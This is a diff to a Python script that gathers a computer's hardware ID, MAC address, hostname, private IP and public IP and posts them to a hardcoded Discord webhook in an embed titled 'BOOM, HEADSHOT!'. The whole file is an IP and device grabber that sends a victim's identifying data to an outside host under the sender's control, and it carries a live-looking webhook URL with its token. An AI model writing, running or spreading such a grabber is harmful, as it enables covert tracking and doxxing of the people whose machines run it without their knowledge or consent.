@@ -4,12 +4,14 @@ import time
 import socket
 import subprocess
 import uuid
+
 hwid = uuid.getnode()
 mac_address = ':'.join(['{:02x}'.format((hwid >> i) & 0xff) for i in range(0, 48, 8)])
 computer_name = socket.gethostname()
 private_ip = socket.gethostbyname(socket.gethostname())
-public_ip = socket.gethostbyname(socket.getfqdn())
-token = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
+public_ip = requests.get('https://api.ipify.org').text
+webhook_url = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ
+"
 
 embed = {
     "title": "BOOM, HEADSHOT!",
@@ -23,13 +25,13 @@ embed = {
         },
         {
             "name": "Device Details",
-            "value": f"Public IP: {hwid}\nPrivate IP: {mac_address}",
+            "value": f"HWID: {hwid}\nMAC Address: {mac_address}",
             "inline": False
         }
     ],
     "footer": {
         "text": "360 FUCKING NOSCOPED!",
-        "icon_url": "https://imgur.com/jWr67J8"
+        "icon_url": "https://example.com/your-image.png"
     }
 }
 
@@ -44,7 +46,7 @@ headers = {
 }
 
 # Send the webhook
-response = requests.post(token, data=json.dumps(payload), headers=headers)
+response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
 
 # Check the response
 if response.status_code == 204:
